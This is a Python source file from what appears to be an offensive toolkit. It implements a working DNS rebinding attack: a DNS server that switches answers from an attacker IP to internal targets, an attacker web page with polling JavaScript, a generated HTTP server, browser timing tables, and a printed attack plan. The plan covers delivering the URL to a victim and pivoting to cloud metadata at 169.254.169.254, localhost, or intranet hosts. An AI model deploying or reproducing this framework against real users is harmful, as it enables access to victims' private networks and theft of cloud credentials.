# language: Python, file: Program/dns/rebind.py, target: Red Sky dns — DNS rebinding
# DNS rebinding attack framework. Two roles:
#   server   -- authoritative DNS server that rotates the A record between your
#               attacker IP and the target internal IP, with TTL 0/1 so the
#               browser re-queries on the next request.
#   redirect -- HTTP server the browser lands on first (the "attacker" phase)
#               that holds the connection open with JS long-poll until the DNS
#               cache has expired, then triggers the actual rebind fetch.
# Also emits browser timing tables and per-browser rebind tricks.

import json
import socket
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DNS_DIR = OUTPUT_DIR / "dns"
REBIND_DIR = DNS_DIR / "rebind"
REBIND_DIR.mkdir(parents=True, exist_ok=True)


# ── browser rebind timings ──
BROWSER_TIMINGS = [
    {"browser": "Chrome 120+", "dns_cache_ttl": "respects TTL, min 60s historically",
     "rebind_window": "60-120s", "notes": "Chrome enforces minimum DNS cache; use two domains or wait."},
    {"browser": "Firefox 120+", "dns_cache_ttl": "respects TTL, min 60s",
     "rebind_window": "60-120s", "notes": "similar to Chrome. dns.disablePrefetch helps attackers."},
    {"browser": "Safari 17", "dns_cache_ttl": "system resolver TTL (macOS mDNSResponder)",
     "rebind_window": "0-60s", "notes": "usually fastest to rebind because it defers to the OS."},
    {"browser": "Edge 120+", "dns_cache_ttl": "same engine as Chrome",
     "rebind_window": "60-120s", "notes": "Chromium-based, same behavior."},
    {"browser": "Brave 1.60+", "dns_cache_ttl": "Chromium-based",
     "rebind_window": "60-120s", "notes": "same as Chrome."},
]


def _build_query_response(txid: int, qname: str, ip: str, ttl: int) -> bytes:
    """Return a DNS A record response."""
    header = struct.pack(">HHHHHH", txid, 0x8180, 1, 1, 0, 0)
    qn = b""
    for part in qname.split("."):
        if not part:
            continue
        b = part.encode()
        if len(b) > 63:
            b = b[:63]
        qn += bytes([len(b)]) + b
    qn += b"\x00"
    question = qn + struct.pack(">HH", 1, 1)  # A, IN
    answer = (b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, ttl, 4)
              + socket.inet_aton(ip))
    return header + question + answer


def _extract_qname(data: bytes) -> Tuple[str, int]:
    if len(data) < 12:
        return "", 0
    txid = struct.unpack(">H", data[:2])[0]
    off = 12
    parts = []
    while off < len(data) and data[off] != 0:
        n = data[off]
        off += 1
        if off + n > len(data):
            break
        parts.append(data[off:off+n].decode("ascii", errors="replace"))
        off += n
    return ".".join(parts), txid


class RebindServer:
    """Authoritative DNS server that rotates between two IPs per client.
    First N queries -> attacker IP. After the switch, all queries -> target IP.
    Also resets after a cooldown so you can retry against the same victim."""

    def __init__(self, bind_host: str, bind_port: int, domain: str,
                 attacker_ip: str, target_ip: str, ttl: int, switch_after: int,
                 reset_after_s: int):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.domain = domain.lower().rstrip(".")
        self.attacker_ip = attacker_ip
        self.target_ip = target_ip
        self.ttl = ttl
        self.switch_after = switch_after
        self.reset_after_s = reset_after_s
        self.clients: Dict[str, Dict] = {}
        self.lock = threading.Lock()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((bind_host, bind_port))

    def _pick_ip(self, client: str) -> str:
        now = time.time()
        with self.lock:
            state = self.clients.setdefault(client, {"count": 0, "switched_at": 0})
            # reset stale state
            if state["switched_at"] and now - state["switched_at"] > self.reset_after_s:
                state["count"] = 0
                state["switched_at"] = 0
            if state["count"] < self.switch_after:
                state["count"] += 1
                return self.attacker_ip
            else:
                if not state["switched_at"]:
                    state["switched_at"] = now
                return self.target_ip

    def run(self):
        print_ok("rebind DNS on " + self.bind_host + ":" + str(self.bind_port))
        print_info("domain *." + self.domain)
        print_info("attacker " + self.attacker_ip + " -> target " + self.target_ip)
        print_info("switch after " + str(self.switch_after) + " queries per client")
        print()
        while True:
            try:
                data, addr = self.sock.recvfrom(512)
            except Exception:
                continue
            qname, txid = _extract_qname(data)
            qname_lower = qname.lower()
            if not qname_lower.endswith(self.domain):
                continue
            ip = self._pick_ip(addr[0])
            print("  " + ASH + addr[0].ljust(16) + RESET + " " + BONE + qname[:50].ljust(50) + RESET
                  + " -> " + SCARLET + ip + RESET)
            self.sock.sendto(_build_query_response(txid, qname, ip, self.ttl), addr)


# ── HTTP attacker page ──
ATTACKER_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>Loading...</title>
<style>body{{font-family:monospace;background:#0b0b0b;color:#e6e6e6;padding:2em}}
pre{{background:#161616;padding:1em;border:1px solid #333;white-space:pre-wrap}}</style>
</head><body>
<h1>Rebind in progress</h1>
<p>Waiting for the DNS cache to expire...</p>
<pre id="log"></pre>
<script>
const log = (s) => document.getElementById('log').textContent += s + '\\n';
let attempts = 0;
const MAX = 600;

function probe() {{
  attempts++;
  fetch('/target', {{ cache: 'no-store', mode: 'no-cors' }})
    .then(r => {{
      log('attempt ' + attempts + ' status ' + r.status);
      if (r.status === 200) {{
        // rebind succeeded — target is now our resolver's answer
        fetch('/target/exec')
          .then(t => t.text())
          .then(body => {{ document.body.innerHTML = '<pre>' + body + '</pre>'; }});
      }} else {{
        retry();
      }}
    }})
    .catch(e => {{ log('attempt ' + attempts + ' error'); retry(); }});
}}

function retry() {{
  if (attempts >= MAX) {{ log('gave up'); return; }}
  setTimeout(probe, 500);
}}
probe();
</script>
</body></html>
"""


def _make_attacker_handler(domain: str) -> type:
    class AttackerHandler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            body = ATTACKER_HTML.format()
            data = body.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(data)

    return AttackerHandler


def cmd_server(bind_host: str, bind_port: int, domain: str,
               attacker_ip: str, target_ip: str, ttl: int, switch_after: int,
               reset_after: int) -> int:
    if not domain or not attacker_ip or not target_ip:
        print_err("--domain, --attacker-ip, --target-ip required")
        return 2
    print_info("DNS rebinding server")
    print_kv("bind", bind_host + ":" + str(bind_port))
    print_kv("domain", domain)
    print_kv("attacker_ip", attacker_ip)
    print_kv("target_ip", target_ip)
    print_kv("ttl", str(ttl))
    print_kv("switch_after", str(switch_after) + " queries per client")
    print()
    print_warn("this server needs root (port 53)")
    print()
    try:
        srv = RebindServer(bind_host, bind_port, domain, attacker_ip, target_ip,
                           ttl, switch_after, reset_after)
        srv.run()
    except KeyboardInterrupt:
        print()
        print_info("shutting down")
    return 0


def cmd_http_page(port: int, out_dir: str) -> int:
    """Write the attacker HTML + a small Python HTTP server that serves it.
    Victim loads this page first from the attacker IP, then JS long-polls until
    the rebind takes effect and hits /target which lands on the internal host."""
    target = Path(out_dir) if out_dir else REBIND_DIR
    target.mkdir(parents=True, exist_ok=True)
    (target / "index.html").write_text(ATTACKER_HTML.format())

    server_src = '''# language: Python, file: rebind_http.py, target: Red Sky dns — attacker HTTP phase
# Serve index.html. Also expose /target (the post-rebind fetch endpoint).
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).parent
INDEX = (ROOT / "index.html").read_bytes()

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(INDEX)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(INDEX)
        elif self.path == "/target":
            # this endpoint is what the JS polls after rebind.
            # Once the DNS rotates, this same path resolves to the internal
            # service -> the response body is whatever the target returns.
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"internal-response")
        elif self.path == "/target/exec":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>rebind successful</h1><p>you are now talking to the internal host</p>")
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 80
    print(f"serving on 0.0.0.0:{port}")
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
'''
    (target / "rebind_http.py").write_text(server_src)
    print_ok("wrote " + str(target / "index.html"))
    print_ok("wrote " + str(target / "rebind_http.py"))
    print()
    print_info("run: sudo python3 " + str(target / "rebind_http.py") + " " + str(port))
    return 0


def cmd_timings(out_file: str) -> int:
    print_info("browser rebind timing table")
    print()
    for b in BROWSER_TIMINGS:
        print(BOLD + SCARLET + b["browser"] + RESET)
        print("  " + ASH + "dns cache: " + RESET + b["dns_cache_ttl"])
        print("  " + ASH + "window:    " + RESET + b["rebind_window"])
        print("  " + ASH + "notes:     " + RESET + CLOT + b["notes"] + RESET)
        print()

    out = Path(out_file) if out_file else REBIND_DIR / ("timings_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(BROWSER_TIMINGS, indent=2))
    print_kv("saved", out)
    return 0


def cmd_plan(target_service: str, out_file: str) -> int:
    print_info("rebind attack plan")
    print_kv("target service", target_service or "(unspecified)")
    print()
    print(BOLD + "1. register a short-TTL domain" + RESET)
    print("  " + ARROW + " e.g. rebind.example.com — you own the NS records")
    print()
    print(BOLD + "2. run the rebind DNS server" + RESET)
    print("  " + ARROW + " redsky dns rebind server --domain rebind.example.com \\")
    print("         --attacker-ip YOUR_PUBLIC_IP --target-ip 127.0.0.1 --ttl 1 --switch-after 2")
    print()
    print(BOLD + "3. run the attacker HTTP phase" + RESET)
    print("  " + ARROW + " on your public IP, port 80: serve index.html")
    print()
    print(BOLD + "4. deliver the URL to the victim" + RESET)
    print("  " + ARROW + " http://rebind.example.com/ — the page opens normally")
    print("  " + ARROW + " JS starts long-polling /target every 500ms")
    print()
    print(BOLD + "5. rebind fires" + RESET)
    print("  " + ARROW + " after " + str(2) + " queries, DNS answers with the target IP")
    print("  " + ARROW + " next /target fetch hits the internal service on the victim's own network")
    print()
    print(BOLD + "6. SSRF variants" + RESET)
    print("  " + ARROW + " rebind to 169.254.169.254 -> cloud metadata")
    print("  " + ARROW + " rebind to 127.0.0.1 -> victim's own services")
    print("  " + ARROW + " rebind to 10.x.x.x -> intranet hosts")
    print()

    plan = {"target_service": target_service, "steps": [
        "register domain", "run rebind DNS", "run HTTP phase", "deliver URL",
        "wait for rebind", "fetch internal service",
    ]}
    out = Path(out_file) if out_file else REBIND_DIR / ("plan_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(plan, indent=2))
    print_kv("saved", out)
    return 0


ARROW = SCARLET + "▸" + RESET


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky dns rebind", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["server", "http", "timings", "plan", "help"])
    p.add_argument("--domain", default="")
    p.add_argument("--attacker-ip", default="")
    p.add_argument("--target-ip", default="127.0.0.1")
    p.add_argument("--bind-host", default="0.0.0.0")
    p.add_argument("--bind-port", type=int, default=53)
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--ttl", type=int, default=1)
    p.add_argument("--switch-after", type=int, default=2)
    p.add_argument("--reset-after", type=int, default=300)
    p.add_argument("--target-service", default="")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky dns rebind <server|http|timings|plan> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("server  --domain rebind.evil.com --attacker-ip 1.2.3.4 --target-ip 127.0.0.1")
        print_info("http    [--port 80] [--out dir]")
        print_info("timings -- browser DNS cache table")
        print_info("plan    [--target-service '169.254.169.254']")
        return 0

    if ns.action == "server":
        return cmd_server(ns.bind_host, ns.bind_port, ns.domain, ns.attacker_ip,
                          ns.target_ip, ns.ttl, ns.switch_after, ns.reset_after)
    if ns.action == "http":
        return cmd_http_page(ns.port, ns.out)
    if ns.action == "timings":
        return cmd_timings(ns.out)
    if ns.action == "plan":
        return cmd_plan(ns.target_service, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
